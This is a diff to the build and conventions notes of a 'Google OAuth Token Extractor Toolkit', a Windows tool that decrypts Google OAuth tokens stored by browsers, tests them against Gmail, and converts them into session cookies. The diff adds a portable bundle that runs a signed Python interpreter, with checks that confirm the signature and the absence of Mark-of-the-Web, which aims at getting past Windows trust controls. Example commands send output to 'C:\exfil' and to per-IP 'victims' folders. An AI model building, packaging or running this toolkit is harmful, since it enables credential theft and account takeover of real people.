@@ -18,9 +18,11 @@ the Gmail API, and converts them into browser session cookies.
 - **Three scripts, one entry point.** `extract_tokens_windows.py`,
   `test_token.py` and `token_to_session.py` each run standalone *and* are
   reachable as subcommands of `pyz/__main__.py`.
-- **Two shipped artifacts**, both built from that one entry point:
+- **Three shipped artifacts**, all built from that one entry point:
   - `dist/goe.pyz` — zipapp; target needs Python + deps.
   - `dist/goe.exe` — PyInstaller onefile; target needs nothing.
+  - `dist/goe-portable\` (+ `.zip`) — embeddable Python 3.13.15 + deps + the pyz;
+    target needs nothing *and* launches a signed `python.exe`.
 - **Windows-only** for extraction (DPAPI). The `requests`-based scripts are
   cross-platform.
 - Prose product name is "Google OAuth Token Extractor Toolkit". **The artifacts
@@ -42,7 +44,11 @@ google-oauth-extractor\
 │   └── __main__.py               # *** SINGLE ENTRY POINT for BOTH artifacts ***
 ├── build_pyz.py                  # Recipe: -> dist\goe.pyz   (stdlib zipapp)
 ├── build_exe.py                  # Driver:  -> dist\goe.exe  (PyInstaller)
+├── build_portable.py             # Recipe: -> dist\goe-portable\ + .zip
 ├── goe.spec                      # PyInstaller recipe — COMMITTED, edit this
+├── portable\
+│   ├── goe.cmd                   # Launcher, copied into the bundle
+│   └── README.txt                # Reader-facing notes, copied into the bundle
 ├── docs\
 │   ├── TOKEN_EXTRACTION_WINDOWS.md   # Where tokens live, crypto chain, ABE, failure modes
 │   ├── PACKAGING_PYTHON_CLI.md       # Freezers vs zipapp; §10 = Windows trust (MOTW/SAC)
@@ -51,8 +57,10 @@ google-oauth-extractor\
 │   ├── google-oauth-tokens-tutorial.md
 │   └── google-oauth-tokens-validation.md
 ├── dist\                         # BUILD OUTPUT            (gitignored)
-│   ├── goe.pyz                   #   zipapp  ~56 KiB
-│   └── goe.exe                   #   onefile ~12.5 MiB
+│   ├── goe.pyz                   #   zipapp   ~56 KiB
+│   ├── goe.exe                   #   onefile  ~12.5 MiB
+│   ├── goe-portable\             #   embedded Python + deps + pyz   49.5 MiB
+│   └── goe-portable.zip          #   the same, zipped for transfer  23.3 MiB
 ├── build\                        # Scratch: build\pyz_app\, build\goe\  (gitignored)
 ├── .venv-build\                  # Pinned build env for PyInstaller      (gitignored)
 └── output_tokens\                # Extracted PLAINTEXT TOKENS            (gitignored)
@@ -131,9 +139,10 @@ py dist\goe.pyz extract --browser yandex --output C:\exfil
 py dist\goe.pyz test  victims\PH_112.201.133.55\
 py dist\goe.pyz session victims\PH_112.201.133.55\token_01.txt
 
-:: --- build both artifacts ---
-python build_pyz.py                       :: -> dist\goe.pyz  (instant, stdlib only)
-.venv-build\Scripts\python build_exe.py --clean --run   :: -> dist\goe.exe (~25 s)
+:: --- build all three artifacts ---
+python build_pyz.py                                     :: -> dist\goe.pyz  (instant)
+.venv-build\Scripts\python build_exe.py --clean --run    :: -> dist\goe.exe  (~25 s)
+.venv-build\Scripts\python build_portable.py --clean     :: -> dist\goe-portable\ + .zip (~45 s)
 ```
 
 The `.exe` build **must** use the pinned venv (`.venv-build`); that is what keeps
@@ -157,8 +166,10 @@ source. Never hand-edit `dist\goe.exe`; edit `goe.spec` / `build_exe.py`.
 | Interpreter | Python 3.13.15 (`py` launcher available) |
 | Build venv | `.venv-build\` — PyInstaller 6.22.3 |
 | Runtime deps | requests 2.34.2, pycryptodome 3.23.0, pywin32 312 |
-| Artifacts | `dist\goe.pyz` ~56 KiB · `dist\goe.exe` ~12.5 MiB |
+| Artifacts | `dist\goe.pyz` ~56 KiB · `dist\goe.exe` ~12.5 MiB · `dist\goe-portable\` 49.5 MiB (`goe-portable.zip` 23.3 MiB) |
+| Bundled interpreter | Python **3.13.15** embeddable (`python-3.13.15-embed-amd64.zip`) — pinned to match the venv |
 | Onefile startup | ~1.0 s (self-extracts to `%TEMP%` on every launch) |
+| Portable startup | immediate (no extraction) |
 
 ---
 
@@ -196,6 +207,10 @@ source. Never hand-edit `dist\goe.exe`; edit `goe.spec` / `build_exe.py`.
 | 7 | **ABE rollout is version-dependent.** | Google migrated *cookies* first and listed "other persistent authentication tokens" as future work — so whether rows are `v20` depends on the build. Never assume v20 is universal, or absent. |
 | 8 | **Docs/code drift has already happened once.** | The docs listed Opera/Vivaldi paths long before `BROWSER_PATHS` supported them. When changing browsers, update code **and** docs **and** `--help`. |
 | 9 | **Output filenames collide on Gaia ID.** Files are named `token_<browser>_<profile>_<gaia>.txt`, so two rows for the *same account* in one profile overwrite each other on disk. | Both rows are still kept in `all_tokens.txt` / `extraction_report.txt`. The scheme is documented in `README.md` — don't change it casually. |
+| 10 | **`import site` in the embed's `pythonNNN._pth` is mandatory.** A `._pth` file suppresses `site` by default, so no `.pth` is processed. | `pywin32.pth` adds `win32\lib` and runs `import pywin32_bootstrap`; the bootstrap registers `pywin32_system32`. Without `site` the failure is a **DLL-load error**, not a clean `ImportError` — easy to misdiagnose. |
+| 11 | **The embeddable dist is more complete than folklore says.** It already ships `_sqlite3.pyd` + `sqlite3.dll`, `_ssl.pyd` + `libssl-3.dll`/`libcrypto-3.dll`, `_socket`, `select`, `_hashlib`, `unicodedata`. | Do **not** hand-copy DLLs next to `python.exe` "to be safe" — it was unnecessary here and only obscures future debugging. |
+| 12 | **Wheel pinning differs per package.** `pycryptodome` resolves to `cp37-abi3-win_amd64` (works on any CPython >= 3.7); `pywin32` ships version-specific wheels (`cp312`, `cp313`, `cp314`, …). | This is why the portable bundle pins 3.13.15 to match the venv: pywin32 locks you to the exact interpreter version. |
+| 13 | **The portable bundle is intentionally NOT pruned.** `site-packages` carries `win32com`, `pythonwin`, `isapi`, `adodbapi` and the full embed stdlib. | Leave it. Deletions are runtime risk, and spare capacity is wanted for future features. Only prune on explicit instruction, with an import test after. |
 
 ---
 
@@ -284,6 +299,16 @@ dist\goe.exe extract --browser yandex --output %TEMP%\x
 
 Also run from a different CWD and from a path containing spaces.
 
+For the portable bundle — all four of these are automated by
+`build_portable.py`'s self-test, so a successful build already covers them:
+
+```bat
+dist\goe-portable\python\python.exe -c "import win32crypt, Crypto.Cipher.AES, requests, sqlite3, ssl"
+dist\goe-portable\goe.cmd --version
+powershell -c "(Get-AuthenticodeSignature dist\goe-portable\python\python.exe).Status"   :: Valid = PSF
+powershell -c "(Get-Item dist\goe-portable\python\python.exe -Stream *).Stream"           :: only :$DATA = no MOTW
+```
+
 ---
 
 ## 10. Safety & Secrets Policy
@@ -305,7 +330,8 @@ Also run from a different CWD and from a path containing spaces.
 
 - [ ] changed scripts compile (`python -m py_compile ...`)
 - [ ] every subcommand `--help` works; exit-code matrix unchanged (1 / 2 / 2 / 0)
-- [ ] both artifacts rebuilt (`build_pyz.py`, then `build_exe.py --clean --run`)
+- [ ] all three artifacts rebuilt — `build_pyz.py`, `build_exe.py --clean --run`,
+      `build_portable.py --clean` (the portable build self-tests as part of itself)
 - [ ] `goe.exe extract --help` prints argparse — proof the deps are bundled
 - [ ] docs updated: `README.md`, the relevant `docs\*.md`, and this file if a
       convention moved
